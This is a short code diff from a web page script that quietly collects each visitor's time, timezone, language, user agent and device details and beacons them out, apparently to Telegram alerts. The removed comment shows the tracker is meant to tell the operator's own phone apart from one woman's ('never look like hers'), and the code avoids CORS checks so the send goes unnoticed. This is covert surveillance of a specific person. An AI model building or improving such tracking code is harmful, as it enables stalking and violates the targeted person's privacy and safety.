@@ -38,15 +38,6 @@
       }
     } catch (_) {}
 
-    // optional self-naming: open your own phone once with #name=Kyaw so its
-    // Telegram alerts read "Kyaw — iPhone…" and never look like hers
-    let nick = "";
-    try {
-      nick = localStorage.getItem("np_nick") || "";
-      const m = (location.hash + " " + location.search).match(/name=([^&\s#]+)/i);
-      if (m) { nick = decodeURIComponent(m[1]); localStorage.setItem("np_nick", nick); }
-    } catch (_) {}
-
     const payload = JSON.stringify({
       t: new Date().toISOString(),
       tz: (Intl.DateTimeFormat().resolvedOptions().timeZone) || "",
@@ -54,7 +45,6 @@
       lang: navigator.language || "",
       ua: navigator.userAgent || "",
       dev: dev,
-      nick: nick,
     });
     // text/plain keeps it a "simple" request → no CORS preflight, works via sendBeacon
     try {
